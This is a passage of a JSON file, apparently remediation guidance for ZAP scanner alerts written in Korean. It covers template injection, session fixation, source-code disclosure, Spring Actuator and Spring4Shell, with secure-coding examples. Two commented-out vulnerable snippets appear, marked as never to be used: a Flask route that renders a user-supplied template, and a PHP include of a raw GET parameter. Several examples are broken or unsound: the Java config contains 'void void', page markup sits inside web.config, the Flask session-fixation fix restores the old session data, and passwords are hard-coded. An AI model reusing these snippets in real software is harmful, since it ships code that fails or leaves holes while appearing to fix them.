      "**데이터와 템플릿 코드 분리:** 사용자 입력이 템플릿 코드의 일부로 해석되도록 허용하지 않습니다. 데이터는 템플릿 변수로 전달되어야 합니다.",
      "**샌드박스 템플릿 엔진 사용:** 가능하다면, 샌드박스(Sandbox) 모드를 지원하는 템플릿 엔진을 사용하여 템플릿 내에서 접근 가능한 함수, 객체, 속성 등을 제한합니다.",
      "**템플릿 엔진 버전 관리:** 사용 중인 템플릿 엔진을 최신 버전으로 유지하고, 알려진 SSTI 취약점 패치를 적용합니다.",
      "**정적 분석 도구 활용:** SAST (Static Application Security Testing) 도구를 사용하여 잠재적인 SSTI 취약점을 코드에서 탐지합니다."
    ],
    "example_code_python_jinja2_secure": "from flask import Flask, render_template_string, request, escape\n\napp = Flask(__name__)\n\n@app.route('/greet')\ndef greet():\n    name = request.args.get('name', 'Guest')\n\n    # 안전한 방법: 사용자 입력에 대해 Jinja2의 자동 이스케이프 기능을 사용합니다.\n    # render_template_string은 기본적으로 자동 이스케이프를 수행합니다.\n    # 명시적으로 escape() 함수를 사용할 수도 있습니다.\n    template = \"Hello, {{ name }}!\"\n    return render_template_string(template, name=name)\n\n@app.route('/greet_manual_escape')\ndef greet_manual_escape():\n    name = request.args.get('name', 'Guest')\n\n    # 수동 이스케이프 예시 (Jinja2는 기본적으로 자동 이스케이프)\n    template = \"Hello, {{ name | e }}!\" # | e 는 escape 필터\n    return render_template_string(template, name=name)\n\n# # 취약한 예시 (절대 사용 금지)\n# @app.route('/insecure_template')\n# def insecure_template():\n#     user_input_template = request.args.get('template', 'Hello, {{ name }}!')\n#     # 사용자 입력이 템플릿 코드로 직접 해석될 수 있어 매우 위험\n#     return render_template_string(user_input_template, name='World')\n\nif __name__ == '__main__':\n    app.run(debug=True)\n    "
  },
  "Server Side Template Injection (Blind)": {
    "translated": "서버 측 템플릿 주입 (블라인드) – 템플릿 주입 공격 중 결과가 바로 보이지 않는 유형",
    "description": "블라인드 SSTI는 일반적인 SSTI와 동일하게 악의적인 템플릿 구문 주입을 통해 서버 측 코드를 실행하지만, 공격 결과를 직접적으로 웹 페이지에서 확인할 수 없고, 대역 외(out-of-band) 통신(예: DNS 쿼리, HTTP 요청)이나 시간 기반 맹점을 통해 유추해야 하는 경우입니다.",
    "solution_guidelines": [
      "**일반 SSTI와 동일한 방어 대책 적용:** 블라인드 SSTI는 일반 SSTI의 한 형태이므로, 모든 사용자 입력에 대한 강력한 유효성 검사 및 이스케이프 처리, 데이터와 템플릿 코드 분리, 샌드박스 템플릿 엔진 사용 등 일반 SSTI에 대한 모든 방어 대책을 적용해야 합니다.",
      "**외부 통신 채널 모니터링:** DNS 쿼리나 HTTP 요청 등 아웃바운드 통신을 모니터링하여 의심스러운 트래픽을 탐지하고 차단합니다.",
      "**타이밍 공격 방지:** 민감한 정보의 유무에 따라 응답 시간이 달라지지 않도록 시간 기반 공격에 대한 방어 로직을 고려합니다."
    ],
    "example_code_general_concept": "\n(Solution is identical to \"Server Side Template Injection\". The 'blind' aspect refers to the detection and exploitation method, not a fundamentally different vulnerability type in terms of prevention.)\n    "
  },
  "Server is running on Clacks - GNU Terry Pratchett": {
    "translated": "서버가 Clacks에서 실행 중 - GNU Terry Pratchett – HTTP 응답 헤더에 특정 메시지(유머 또는 추모 메시지)가 포함됨",
    "description": "서버가 HTTP 응답 헤더에 'X-Clacks-Overhead: GNU Terry Pratchett'을 포함하고 있습니다. 이는 영국의 작가 테리 프래쳇을 기리기 위한 비표준 헤더로, 보안 취약점은 아니지만, 불필요한 정보 노출로 분류될 수 있습니다.",
    "solution_guidelines": [
      "**불필요한 헤더 제거 (권장):** 보안 측면에서 직접적인 위험은 없지만, 불필요한 정보 노출을 최소화하기 위해 이 헤더를 제거하는 것이 좋습니다. 대부분의 웹 서버는 사용자 정의 헤더를 추가하거나 제거하는 기능을 제공합니다.",
      "**정보 노출 최소화 원칙:** 서버가 외부에 제공하는 모든 정보를 최소화하는 것이 보안 모범 사례입니다. 이는 공격자가 시스템에 대한 정보를 수집하는 것을 어렵게 만듭니다."
    ],
    "example_code_nginx": "\n# Nginx 설정 예시 (http, server, location 블록 내)\n# 이 헤더를 명시적으로 추가했다면 제거합니다.\n# proxy_hide_header X-Clacks-Overhead; # 만약 프록시 뒤에 있다면\n    ",
    "example_code_apache": "\n# Apache httpd.conf 또는 .htaccess 예시\n<IfModule mod_headers.c>\n    Header unset X-Clacks-Overhead\n</IfModule>\n    "
  },
  "Session Fixation": {
    "translated": "세션 고정 – 공격자가 유효한 세션 ID를 사용자에게 미리 부여하고, 사용자가 이 세션 ID로 로그인하도록 유도하여 세션을 탈취하는 공격",
    "description": "세션 고정(Session Fixation)은 공격자가 피해자의 웹 세션 ID를 고정시킨 후, 피해자가 해당 세션 ID로 로그인하도록 유도하여 피해자의 세션을 가로채는 공격입니다.",
    "solution_guidelines": [
      "**로그인 시 새로운 세션 ID 생성:** 사용자가 성공적으로 로그인하거나 권한 수준이 변경될 때마다 **항상 새로운 세션 ID를 생성**하고 이전 세션 ID는 무효화해야 합니다. 이는 기존의 고정된 세션 ID를 무효화하여 공격자가 이를 사용할 수 없게 만듭니다.",
      "**세션 ID를 URL에 노출 금지:** 세션 ID가 URL 파라미터로 노출되지 않도록 합니다. 대신 쿠키를 통해 세션 ID를 안전하게 관리합니다.",
      "**`HttpOnly` 및 `Secure` 쿠키 속성 사용:** 세션 쿠키에 `HttpOnly` 속성을 설정하여 JavaScript를 통한 접근을 막고, `Secure` 속성을 설정하여 HTTPS 연결에서만 전송되도록 합니다.",
      "**CSRF 토큰 사용:** 세션 고정 공격은 CSRF 공격과 함께 사용될 수 있으므로, CSRF 토큰을 사용하여 요청의 유효성을 검증합니다."
    ],
    "example_code_java_servlet": "import javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpSession;\n\npublic class SessionFixationProtection {\n    public void onSuccessfulLogin(HttpServletRequest request) {\n        // 기존 세션 무효화 (기존 세션이 있다면)\n        HttpSession oldSession = request.getSession(false);\n        if (oldSession != null) {\n            oldSession.invalidate();\n        }\n\n        // 새로운 세션 생성\n        HttpSession newSession = request.getSession(true);\n        // 새로운 세션에 사용자 정보 저장\n        newSession.setAttribute(\"loggedInUser\", \"username\");\n        // 세션 ID는 자동으로 새롭게 발급됨\n    }\n}\n    ",
    "example_code_php": "<?php\n// PHP 세션 고정 보호 예시\n\n// 로그인 처리 전 (혹은 로그인 후)\nif (isset($_SESSION['user_id'])) {\n    // 이미 로그인된 경우, 세션 무효화 및 새 세션 시작\n    session_destroy();\n    session_start();\n    session_regenerate_id(true); // 새 세션 ID 생성 및 이전 ID 무효화\n}\n\n// 로그인 성공 시\n$_SESSION['user_id'] = $userId;\n$_SESSION['username'] = $username;\nsession_regenerate_id(true); // 로그인 성공 후 새 세션 ID 생성\n?>\n    ",
    "example_code_python_flask": "from flask import session, redirect, url_for\n\ndef login_successful(user_id):\n    # Flask에서 세션 고정 방지: 새 세션 ID 생성\n    # 기존 세션 데이터 백업 (필요한 경우)\n    temp_session_data = dict(session)\n    \n    # 기존 세션 삭제\n    session.clear()\n    \n    # 새로운 세션 시작\n    for key, value in temp_session_data.items():\n        session[key] = value\n    \n    session['user_id'] = user_id\n    # Flask의 기본 세션 구현은 `session.regenerate_id()`와 유사한 동작을 하지 않으므로\n    # `session.clear()` 후 필요한 데이터만 다시 채우는 것이 일반적인 방법.\n    # 더 강력한 보호를 위해 Flask-Login과 같은 라이브러리는 로그인 시 세션 ID를 재생성하는 기능을 제공합니다.\n    \n    return redirect(url_for('dashboard'))\n    "
  },
  "Session ID in URL Rewrite": {
    "translated": "URL 재작성을 통한 세션 ID 노출 – 세션 ID가 URL에 직접 포함되어 노출되어 쉽게 탈취되거나 공유될 수 있음",
    "description": "세션 ID가 URL의 일부로 노출되어 전송되고 있음을 나타냅니다. 이는 세션 ID가 URL 히스토리, 북마크, 웹 서버 로그, Referer 헤더 등에 기록되어 탈취될 위험을 증가시킵니다. 공격자는 이를 통해 세션 하이재킹 공격을 수행할 수 있습니다.",
    "solution_guidelines": [
      "**세션 ID를 쿠키를 통해 관리:** 세션 ID는 항상 HTTP 쿠키를 통해 전송되도록 설정합니다. 이는 가장 안전하고 권장되는 방법입니다.",
      "**URL 리라이팅을 통한 세션 ID 전송 비활성화:** 웹 서버 및 프레임워크 설정을 통해 URL 리라이팅(URL rewriting)을 통한 세션 ID 전송 기능을 명시적으로 비활성화합니다. 대부분의 웹 서버는 기본적으로 쿠키를 선호합니다.",
      "**`HttpOnly` 및 `Secure` 쿠키 속성 사용:** 세션 쿠키에 `HttpOnly` 속성을 설정하여 JavaScript를 통한 접근을 막고, `Secure` 속성을 설정하여 HTTPS 연결에서만 전송되도록 합니다.",
      "**자동 URL 리라이팅 확인:** 애플리케이션 프레임워크나 웹 서버가 자동으로 세션 ID를 URL에 포함하도록 설정되어 있는지 확인하고 비활성화합니다."
    ],
    "example_code_java_servlet_web_xml": "<session-config>\n    <tracking-mode>COOKIE</tracking-mode>\n</session-config>\n    ",
    "example_code_php_ini": "; php.ini 설정 (URL에 세션 ID 노출 방지)\nsession.use_trans_sid = 0\nsession.use_only_cookies = 1\nsession.cookie_httponly = 1\nsession.cookie_secure = 1\n    ",
    "example_code_asp_net_web_config": "<system.web>\n    <sessionState cookieless=\"UseCookies\" />\n</system.web>\n    "
  },
  "Session Management Response Identified": {
    "translated": "세션 관리 응답 식별 – 웹 애플리케이션의 세션 관리와 관련된 응답이 감지됨",
    "description": "웹 애플리케이션이 세션 관리에 사용되는 HTTP 응답(예: `Set-Cookie` 헤더)을 생성하고 있음을 나타냅니다. 이는 취약점이라기보다는 ZAP이 세션 관련 응답을 식별했음을 의미합니다. 이 자체는 문제가 아니지만, 세션 관리의 안전성(취약점은 아님)을 확인하기 위한 추가 분석이 필요합니다.",
    "solution_guidelines": [
      "**세션 쿠키의 보안 속성 확인:** 세션 쿠키가 `HttpOnly`, `Secure`, `SameSite` (특히 `Lax` 또는 `Strict`)와 같은 적절한 보안 속성을 가지고 있는지 확인합니다.",
      "**세션 ID의 예측 불가능성:** 세션 ID가 충분히 길고 무작위성이 높아 예측하기 어렵도록 생성되는지 확인합니다.",
      "**세션 타임아웃 설정:** 비활성 세션에 대해 적절한 유휴(idle) 및 절대(absolute) 타임아웃이 설정되어 있는지 확인하여 세션 하이재킹 위험을 줄입니다.",
      "**로그인/권한 변경 시 세션 재생성:** 사용자가 로그인하거나 권한 수준이 변경될 때마다 세션 ID가 재생성되는지 확인합니다 (세션 고정 방지)."
    ],
    "example_code_general": "\n(This is an informational alert, not a vulnerability. The guidelines listed above are best practices for secure session management.)\n    "
  },
  "Source Code Disclosure - /WEB-INF Folder": {
    "translated": "소스 코드 노출 - /WEB-INF 폴더 – Java 웹 애플리케이션의 /WEB-INF 폴더에 소스 코드 파일이 노출됨",
    "description": "J2EE 애플리케이션에서 `/WEB-INF` 디렉토리가 웹 서버를 통해 직접 접근 가능하여 민감한 구성 파일(예: `web.xml`), 클래스 파일, JSP 소스 코드 등이 노출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**`/WEB-INF` 디렉토리 직접 접근 차단:** `/WEB-INF` 디렉토리는 WAS(Web Application Server)에 의해 보호되어야 하며, 웹 서버를 통해 직접 접근할 수 없도록 구성되어야 합니다. 대부분의 WAS는 기본적으로 이 디렉토리의 직접 접근을 막습니다.",
      "**애플리케이션 배포 점검:** 애플리케이션 배포 시 `/WEB-INF` 폴더가 웹 루트 외부에 위치하거나, WAS의 보안 정책에 따라 올바르게 보호되는지 확인합니다.",
      "**불필요한 파일 제거:** `/WEB-INF` 내부에 디버깅용 파일, 백업 파일 등 배포에 불필요한 민감한 파일이 포함되지 않도록 합니다."
    ],
    "example_code_web_server_config": "\n# Nginx 예시 (WAS를 프록시하는 경우)\nlocation ~ ^/WEB-INF/ {\n    deny all;\n}\n\n# Apache 예시 (WAS를 프록시하는 경우)\n<LocationMatch \"/WEB-INF/\">\n    Order allow,deny\n    Deny from all\n</LocationMatch>\n    "
  },
  "Source Code Disclosure - CVE-2012-1823": {
    "translated": "소스 코드 노출 - CVE-2012-1823 – PHP CGI 취약점(CVE-2012-1823)으로 인해 PHP 소스 코드가 직접 노출될 수 있음",
    "description": "PHP CGI의 CVE-2012-1823 취약점으로 인해 웹 서버를 통해 PHP 소스 코드가 직접 노출될 수 있습니다. 이 취약점은 `php-cgi` 실행 방식에서 특정 URL 요청 패턴을 통해 발생했습니다.",
    "solution_guidelines": [
      "**PHP 버전 업데이트:** 이 취약점은 오래된 PHP 버전(5.3.12 이전, 5.4.2 이전)에 존재하므로, PHP를 최신 안정 버전으로 즉시 업데이트합니다.",
      "**PHP-FPM 또는 Apache `mod_php` 사용:** `php-cgi` 대신 PHP-FPM(FastCGI Process Manager)이나 Apache의 `mod_php`와 같은 더 안전한 PHP 실행 방식을 사용합니다.",
      "**웹 서버 설정 강화:** 웹 서버(Apache, Nginx 등)에서 `.php` 파일에 대한 요청이 `php-cgi`로 직접 전달되지 않도록 설정하거나, 특정 파일 확장자를 강제로 PHP 스크립트로 해석하지 않도록 합니다.",
      "**불필요한 파일 제거:** 웹 루트에 소스 코드, 백업 파일, 버전 관리 메타데이터(`.git`, `.svn` 등)와 같은 민감한 파일이 존재하지 않도록 합니다."
    ],
    "example_code_nginx_php_fpm": "\n# Nginx PHP-FPM 설정 예시 (CVE-2012-1823 방지)\nlocation ~ \\.php$ {\n    try_files $uri =404;\n    fastcgi_split_path_info ^(.+\\.php)(/.+)$;\n    fastcgi_pass unix:/var/run/php/php7.4-fpm.sock; # 또는 TCP 소켓\n    fastcgi_index index.php;\n    include fastcgi_params;\n    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n    fastcgi_param PATH_INFO $fastcgi_path_info;\n}\n    "
  },
  "Source Code Disclosure - File Inclusion": {
    "translated": "소스 코드 노출 - 파일 포함 – 파일 포함 취약점을 통해 웹 서버의 소스 코드가 노출됨",
    "description": "LFI(Local File Inclusion) 또는 RFI(Remote File Inclusion) 취약점으로 인해 공격자가 웹 애플리케이션 서버의 로컬 파일이나 원격 서버의 파일을 로드하여 실행하거나 소스 코드를 열람할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**사용자 입력에 대한 강력한 유효성 검사:** 파일 포함 함수(예: PHP의 `include`, `require`)에 전달되는 모든 사용자 입력 경로에 대해 엄격한 화이트리스트 기반의 유효성 검사를 수행합니다. 허용된 파일만 포함될 수 있도록 제한합니다.",
      "**경로 조작 문자 필터링:** `..`, `/`, `\\` 등 디렉토리 트래버설을 유발할 수 있는 문자를 사용자 입력에서 제거하거나 거부합니다.",
      "**절대 경로 사용 및 파일명만 허용:** 파일 포함 시 사용자 입력에서 파일명만 추출하여 애플리케이션 내부에서 정의된 절대 경로와 조합하여 사용합니다.",
      "**파일 포함 함수 사용 최소화:** 사용자 입력으로 파일을 포함해야 하는 경우를 최소화하고, 가능하다면 다른 안전한 방식으로 기능을 구현합니다.",
      "**PHP `allow_url_include` 비활성화:** `php.ini`에서 `allow_url_include = Off`로 설정하여 원격 파일 포함(RFI)을 방지합니다.",
      "**Least Privilege:** 웹 서버 프로세스에 필요한 최소한의 파일 시스템 접근 권한만 부여합니다."
    ],
    "example_code_php_secure": "<?php\n// PHP File Inclusion Secure Example\nif (isset($_GET['page'])) {\n    $page = $_GET['page'];\n\n    // 1. 화이트리스트 기반의 유효성 검사\n    $allowedPages = [\n        'home.php',\n        'about.php',\n        'contact.php'\n    ];\n\n    if (in_array($page, $allowedPages)) {\n        // 2. 미리 정의된 안전한 경로와 결합\n        $filePath = '/var/www/html/templates/' . $page;\n\n        // 3. 파일 존재 여부 및 읽기 권한 확인\n        if (file_exists($filePath) && is_readable($filePath)) {\n            include($filePath);\n        } else {\n            echo \"Error: File not found or not readable.\";\n        }\n    } else {\n        echo \"Invalid page requested.\";\n    }\n} else {\n    include('/var/www/html/templates/home.php'); // 기본 페이지\n}\n\n// // 취약한 예시 (절대 사용 금지)\n// include($_GET['page'] . '.php');\n?>\n    "
  },
  "Source Code Disclosure - Git": {
    "translated": "소스 코드 노출 - Git – .git 디렉토리가 웹에 노출되어 Git 저장소의 모든 소스 코드가 다운로드될 수 있음",
    "description": ".git 디렉토리 및 그 내용(예: `.git/HEAD`, `.git/config`, `.git/logs`, `.git/objects`)이 웹 서버를 통해 직접 접근 가능하여 애플리케이션의 소스 코드, 커밋 히스토리, 개발자 정보 등 민감한 정보가 노출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**`.git` 디렉토리 웹 접근 차단:** 웹 서버 설정(예: Apache의 .htaccess, Nginx 설정)을 통해 `.git` 디렉토리 및 그 하위 내용에 대한 직접적인 접근을 명시적으로 거부합니다.",
      "**프로덕션 환경 배포 시 `.git` 제거:** 프로덕션 환경에 애플리케이션을 배포할 때는 `.git` 디렉토리를 완전히 제거하거나, `.gitignore` 파일을 올바르게 사용하여 `.git` 디렉토리가 웹 루트에 배포되지 않도록 합니다.",
      "**`.gitignore` 파일 올바르게 사용:** 개발 환경에서 `.gitignore`를 사용하여 민감한 설정 파일, 빌드 아티팩트 등이 Git 저장소에 포함되지 않도록 관리합니다.",
      "**웹 루트 외부에서 개발:** 웹 루트(document root) 외부에서 Git 저장소를 관리하고, 배포 시에만 필요한 파일만 웹 루트로 복사하는 방식을 고려합니다."
    ],
    "example_code_nginx": "\n# Nginx 설정 예시\nlocation ~ /\\.git/ {\n    deny all;\n}\n    ",
    "example_code_apache": "\n# Apache .htaccess 예시\n<DirectoryMatch \"^/\\.git\">\n    Order deny,allow\n    Deny from all\n</DirectoryMatch>\n\n# 또는\nRedirectMatch 404 /\\.git\n    "
  },
  "Source Code Disclosure - PHP": {
    "translated": "소스 코드 노출 - PHP – PHP 소스 코드가 웹에 노출될 수 있음",
    "description": "PHP 파일이 웹 서버 설정 오류로 인해 PHP 코드로 해석되지 않고 원본 텍스트로 사용자에게 전송되어 소스 코드가 노출되는 취약점입니다. 이는 민감한 정보, 데이터베이스 자격 증명, 알고리즘 등이 유출될 수 있습니다.",
    "solution_guidelines": [
      "**웹 서버 PHP 핸들러 설정 확인:** 웹 서버(Apache, Nginx, IIS 등)의 PHP 핸들러 설정이 올바르게 되어 있는지 확인하여 `.php` 확장자를 가진 파일이 PHP 인터프리터에 의해 처리되도록 합니다.",
      "**불필요한 PHP 버전 제거:** 서버에 여러 PHP 버전이 설치되어 있다면, 사용하지 않는 버전을 제거하여 설정 충돌이나 오작동 가능성을 줄입니다.",
      "**`php.ini` 설정 검토:** `php.ini`의 `short_open_tag`, `expose_php` 등의 설정을 확인하고, 필요에 따라 비활성화합니다.",
      "**웹 루트 내 `.htaccess` 확인 (Apache):** 불필요하거나 잘못된 `.htaccess` 파일이 PHP 처리 방식을 변경하여 소스 코드 노출을 유발하는지 확인합니다."
    ],
    "example_code_apache_php_handler": "\n# Apache httpd.conf 또는 virtual host 설정 예시\n# mod_php 사용 시\nLoadModule php_module modules/libphp7.so # PHP 모듈 로드\n<FilesMatch \\.php$>\n    SetHandler application/x-httpd-php\n</FilesMatch>\n\n# PHP-FPM 사용 시 (ProxyPassMatch 또는 FastCgiExternalServer 등)\n# Nginx 예시 (이전 CVE-2012-1823 섹션 참조)\n    "
  },
  "Source Code Disclosure - SVN": {
    "translated": "소스 코드 노출 - SVN – .svn 디렉토리가 웹에 노출되어 SVN 저장소의 모든 소스 코드가 다운로드될 수 있음",
    "description": ".svn 디렉토리 및 그 내용(예: `.svn/entries`, `.svn/wc.db`)이 웹 서버를 통해 직접 접근 가능하여 애플리케이션의 소스 코드, 리비전 히스토리, 개발자 정보 등 민감한 정보가 노출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**`.svn` 디렉토리 웹 접근 차단:** 웹 서버 설정(예: Apache의 .htaccess, Nginx 설정)을 통해 `.svn` 디렉토리 및 그 하위 내용에 대한 직접적인 접근을 명시적으로 거부합니다.",
      "**프로덕션 환경 배포 시 `.svn` 제거:** 프로덕션 환경에 애플리케이션을 배포할 때는 `.svn` 디렉토리를 완전히 제거하거나, 배포 프로세스에서 자동으로 제거되도록 스크립트를 작성합니다.",
      "**웹 루트 외부에서 개발:** 웹 루트(document root) 외부에서 SVN 저장소를 관리하고, 배포 시에만 필요한 파일만 웹 루트로 복사하는 방식을 고려합니다."
    ],
    "example_code_nginx": "\n# Nginx 설정 예시\nlocation ~ /\\.svn/ {\n    deny all;\n}\n    ",
    "example_code_apache": "\n# Apache .htaccess 예시\n<DirectoryMatch \"^/\\.svn\">\n    Order deny,allow\n    Deny from all\n</DirectoryMatch>\n    "
  },
  "Split Viewstate in Use": {
    "translated": "ViewState 분할 사용 중 – ASP.NET ViewState가 여러 부분으로 분할되어 사용되는 경우",
    "description": "ASP.NET 애플리케이션에서 ViewState가 여러 필드로 분할되어 전송되고 있음을 나타냅니다. 이는 ViewState가 너무 커서 단일 필드 제한을 초과할 때 발생할 수 있습니다. 자체는 취약점이 아니지만, 큰 ViewState는 성능 문제를 야기할 수 있으며, 이와 관련된 다른 보안 취약점(예: ViewState 정보 유출)이 있다면 더욱 심각해질 수 있습니다.",
    "solution_guidelines": [
      "**ViewState 크기 최소화:** ViewState에 저장되는 데이터의 양을 최소화합니다. 꼭 필요한 데이터만 ViewState에 저장하고, 서버 측 세션이나 캐시를 사용하여 상태를 관리하는 것을 고려합니다.",
      "**ViewState 대신 다른 상태 관리 기술 고려:** 서버 측 세션, 데이터베이스, 캐시 등 다른 상태 관리 기술을 사용하여 민감한 정보나 대용량 데이터를 관리합니다.",
      "**`EnableViewState` 속성 관리:** 컨트롤별로 `EnableViewState=\"false\"`를 설정하여 불필요한 컨트롤의 ViewState를 비활성화합니다.",
      "**ViewState 암호화 및 MAC 서명 활성화:** ViewState에 민감한 정보가 있다면 반드시 암호화하고 MAC 서명을 활성화하여 변조 및 정보 유출을 방지합니다. (관련: `Viewstate without MAC Signature` 취약점)"
    ],
    "example_code_aspnet_config": "<system.web>\n    <machineKey validationKey=\"AutoGenerate,IsolateApps\" decryptionKey=\"AutoGenerate,IsolateApps\"\n              validation=\"SHA1\" decryption=\"Auto\" />\n    \n    <%@ Page EnableViewState=\"false\" %>\n    <asp:TextBox ID=\"TextBox1\" runat=\"server\" EnableViewState=\"false\"></asp:TextBox>\n</system.web>\n    "
  },
  "Spring Actuator Information Leak": {
    "translated": "Spring Actuator 정보 유출 – Spring Boot Actuator 엔드포인트가 노출되어 애플리케이션의 내부 정보(환경 변수, 빈, 메트릭 등)가 유출될 수 있음",
    "description": "Spring Boot 애플리케이션에서 Spring Actuator 엔드포인트(예: `/actuator`, `/actuator/info`, `/actuator/env`, `/actuator/heapdump` 등)가 노출되어 시스템 환경 정보, 애플리케이션 설정, 메트릭, 힙 덤프 등 민감한 정보가 유출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**Actuator 엔드포인트 노출 제한:** 프로덕션 환경에서는 모든 Actuator 엔드포인트를 노출하지 않거나, 필요에 따라 특정 엔드포인트만 노출합니다.",
      "**보안 강화 (인증/권한 부여):** 노출되는 Actuator 엔드포인트에 대해 Spring Security 등을 사용하여 강력한 인증 및 권한 부여를 적용합니다. 관리자만 접근할 수 있도록 제한합니다.",
      "**웹 경로 변경:** Actuator 엔드포인트의 기본 경로(`/actuator`)를 예측하기 어려운 다른 경로로 변경하여 스캐닝에 의한 탐지를 어렵게 합니다 (`management.endpoints.web.base-path` 설정).",
      "**IP 주소 제한:** 방화벽이나 웹 서버 설정을 통해 Actuator 엔드포인트에 접근할 수 있는 IP 주소를 내부 네트워크 등으로 제한합니다.",
      "**민감한 정보 노출 방지:** `/env`나 `/configprops`와 같은 엔드포인트에서 민감한 정보(예: 비밀번호, API 키)가 마스킹 처리되도록 설정합니다 (`management.endpoint.env.show-values`, `management.endpoint.configprops.show-values` 등을 `never`로 설정)."
    ],
    "example_code_spring_boot_application_properties": "# application.properties 예시 (Spring Boot Actuator 보안)\n\n# 모든 엔드포인트 활성화 (개발/디버깅용, 프로덕션에서는 권장되지 않음)\n# management.endpoints.web.exposure.include=*\n\n# 특정 엔드포인트만 활성화 (권장)\nmanagement.endpoints.web.exposure.include=health,info\n\n# JMX를 통한 노출 비활성화\nmanagement.endpoints.jmx.exposure.include=health,info\n\n# Actuator 기본 경로 변경 (예: /admin/monitor)\n# management.endpoints.web.base-path=/admin/monitor\n\n# 보안을 위해 Spring Security 통합 (build.gradle/pom.xml 에 spring-boot-starter-security 추가)\n# Spring Security가 적용되면 기본적으로 모든 Actuator 엔드포인트는 인증이 필요해집니다.\n# 특정 역할(예: ADMIN)만 접근하도록 설정:\n# application.properties (예시)\n# spring.security.user.name=admin\n# spring.security.user.password=password\n\n// Java Config 예시 (Spring Security)\n@Configuration\n@EnableWebSecurity\npublic class ActuatorSecurityConfig extends WebSecurityConfigurerAdapter {\n\n    @Override\n    protected void void configure(HttpSecurity http) throws Exception {\n        http\n            .authorizeRequests()\n                // /actuator/** 경로에 대해 ADMIN 역할 필요\n                .requestMatchers(EndpointRequest.toAnyEndpoint()).hasRole(\"ADMIN\")\n                .anyRequest().authenticated()\n                .and()\n            .httpBasic(); // 또는 폼 로그인, OAuth2 등\n    }\n\n    @Bean\n    public UserDetailsService userDetailsService() {\n        UserDetails user = User.withDefaultPasswordEncoder()\n            .username(\"admin\")\n            .password(\"adminpassword\")\n            .roles(\"ADMIN\")\n            .build();\n        return new InMemoryUserDetailsManager(user);\n    }\n}\n    "
  },
  "Spring4Shell": {
    "translated": "Spring4Shell – Spring 프레임워크의 원격 코드 실행 취약점",
    "description": "Spring4Shell (CVE-2022-22965)은 Spring Framework의 `data binding` 취약점으로, 특정 조건(JDK 9 이상, Spring Framework 5.3.0 ~ 5.3.17 또는 5.2.0 ~ 5.2.19, Apache Tomcat 및 `war` 배포)에서 원격 코드 실행(RCE)이 가능해지는 심각한 취약점입니다.",
    "solution_guidelines": [
      "**Spring Framework 업데이트:** 가장 중요하며 우선적인 해결책은 Spring Framework를 취약점이 패치된 버전(Spring Framework 5.3.18 이상 또는 5.2.20 이상)으로 즉시 업데이트하는 것입니다.",
      "**Spring Boot 업데이트:** Spring Boot를 사용하는 경우, Spring Framework 종속성을 포함하는 최신 안정 버전(2.6.6 이상 또는 2.5.12 이상)으로 업데이트합니다.",
      "**JDK 버전 검토:** JDK 9 이상에서 주로 발견되었으므로, JDK 버전을 검토하고 필요한 경우 업데이트합니다.",
      "**워크어라운드 적용 (패치 전 임시 방편):** 패치 적용이 어려운 경우, 다음과 같은 임시 방편을 적용할 수 있습니다. (이는 임시 방편일 뿐, 근본적인 해결책은 아닙니다.)\n    * `DisallowedFields`를 사용하여 특정 패턴의 필드 바인딩을 금지합니다.\n    * Tomcat을 사용하지 않거나, `jar` 파일로 배포하여 웹 컨테이너 없이 실행합니다.\n    * DataBinder에 `DisallowedFields`를 명시적으로 설정하여 특정 클래스의 `classLoader` 접근을 막습니다.",
      "**웹 방화벽(WAF) 규칙 적용:** 웹 방화벽을 사용하여 Spring4Shell 공격 시도에 대한 시그니처 기반 규칙을 적용하여 공격을 차단합니다."
    ],
    "example_code_spring_framework_mitigation": "// Spring Framework 5.3.x 이상에서 DisallowedFields를 사용하여 특정 패턴 필드 바인딩을 금지하는 워크어라운드 예시 (임시 방편)\n// 이 코드는 Spring Boot 애플리케이션의 @ControllerAdvice 또는 @InitBinder 메서드에 추가할 수 있습니다.\n\nimport org.springframework.core.SpringVersion;\nimport org.springframework.web.bind.WebDataBinder;\nimport org.springframework.web.bind.annotation.ControllerAdvice;\nimport org.springframework.web.bind.annotation.InitBinder;\n\n@ControllerAdvice\npublic class DisallowedFieldsHandler {\n\n    @InitBinder\n    public void setAllowedFields(WebDataBinder dataBinder) {\n        String[] disallowedFields = new String[]{\n            \"class.*\",\n            \"Class.*\",\n            \"*\" + \"class.*\",\n            \"*\" + \"Class.*\"\n        };\n        dataBinder.setDisallowedFields(disallowedFields);\n    }\n}\n\n// Spring Boot 2.6.x (Spring Framework 5.3.x) 또는 2.5.x (Spring Framework 5.2.x) 버전 업데이트가 가장 확실한 해결책입니다.\n// build.gradle (Spring Boot)\n// dependencies {\n//     implementation 'org.springframework.boot:spring-boot-starter-web'\n//     // ... other dependencies\n// }\n// 'org.springframework.boot:spring-boot-gradle-plugin' 버전 업데이트:\n// id 'org.springframework.boot' version '2.6.6' // 또는 2.5.12 등 패치된 버전\n    "
  },
  "Storable and Cacheable Content": {
    "translated": "저장 및 캐시 가능한 콘텐츠 – 웹 캐시나 저장소에 저장될 수 있는 콘텐츠가 감지됨",
    "description": "응답 헤더에 `Cache-Control: public` 또는 `Cache-Control: max-age`와 같은 캐싱 지시어가 포함되어 있어, 브라우저나 프록시 서버에 의해 콘텐츠가 캐시될 수 있음을 나타냅니다. 이는 일반적으로 웹 성능 최적화를 위한 좋은 신호이지만, 민감한 정보가 캐시될 경우 정보 유출 위험이 있습니다.",
    "solution_guidelines": [
      "**민감한 정보에 대한 캐싱 방지:** 개인 정보, 세션 토큰, 사용자별 데이터 등 민감한 정보가 포함된 응답은 절대로 캐시되지 않도록 `Cache-Control: no-store, no-cache` 또는 `Pragma: no-cache`, `Expires: 0`과 같은 헤더를 설정합니다.",
      "**Cache-Control 정책 명확화:** 캐싱이 필요한 정적 콘텐츠(이미지, CSS, JS)에 대해서만 적절한 `max-age` 또는 `public` 지시어를 사용하고, 동적 또는 민감한 콘텐츠에 대해서는 명확하게 캐싱을 금지하는 정책을 설정합니다.",
      "**Vary 헤더 사용:** 콘텐츠가 `User-Agent` 또는 `Accept-Encoding`과 같은 요청 헤더에 따라 달라지는 경우 `Vary` 헤더를 사용하여 올바른 캐싱 동작을 보장합니다."
    ],
